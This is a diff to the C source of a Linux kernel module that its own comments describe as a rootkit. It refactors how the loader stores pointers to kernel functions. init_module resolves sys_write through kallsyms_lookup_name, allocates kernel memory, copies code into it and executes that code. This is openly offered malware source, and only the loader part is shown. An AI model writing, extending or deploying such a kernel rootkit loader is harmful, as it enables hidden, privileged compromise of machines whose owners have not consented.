@@ -52,11 +52,18 @@
 extern int pinfo(const char *fmt, ...);
 extern int perr(const char *fmt, ...);
 extern void kernel_test(void);
-extern void * (*f_kmalloc)(size_t size, gfp_t flags);
-extern void (*f_kfree)(const void *);
-extern struct pid * (*f_find_vpid)(pid_t nr);
-extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
-extern int (*f_sys_write)(int fd, const char *mem, size_t len);
+
+typedef void * (*tf_kmalloc)(size_t size, gfp_t flags);
+typedef void (*tf_kfree)(const void *);
+typedef struct pid * (*tf_find_vpid)(pid_t nr);
+typedef int (*tf_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
+typedef int (*tf_sys_write)(int fd, const char *mem, size_t len);
+
+extern tf_kmalloc *f_kmalloc(void);
+extern tf_kfree *f_kfree(void);
+extern tf_find_vpid *f_find_vpid(void);
+extern tf_vscnprintf *f_vscnprintf(void);
+extern tf_sys_write *f_sys_write(void);
 
 /*
  * Loader declarations.
@@ -95,17 +102,17 @@ int init_module(void)
 	/*
      * Linux Kernel symbols for our rootkit.
 	 */
-	f_kmalloc = kmalloc;
-	f_kfree = kfree;
-	f_find_vpid = find_vpid;
-	f_vscnprintf = vscnprintf;
-	f_sys_write = kallsyms_lookup_name("sys_write");
+	*f_kmalloc() = kmalloc;
+	*f_kfree() = kfree;
+	*f_find_vpid() = find_vpid;
+	*f_vscnprintf() = vscnprintf;
+	*f_sys_write() = kallsyms_lookup_name("sys_write");
 
 	/*
      * Insert out rootkit into memory.
 	 */
 	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
-	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
+	kernel_addr = (*f_kmalloc())(kernel_paglen, GFP_KERNEL);
 	if (kernel_addr != NULL) {
 		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
@@ -127,7 +134,7 @@ int init_module(void)
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
-		f_kfree(kernel_addr);
+		(*f_kfree())(kernel_addr);
 		return 0;
 	} else {
 		perr("can not allocate memory.\n");
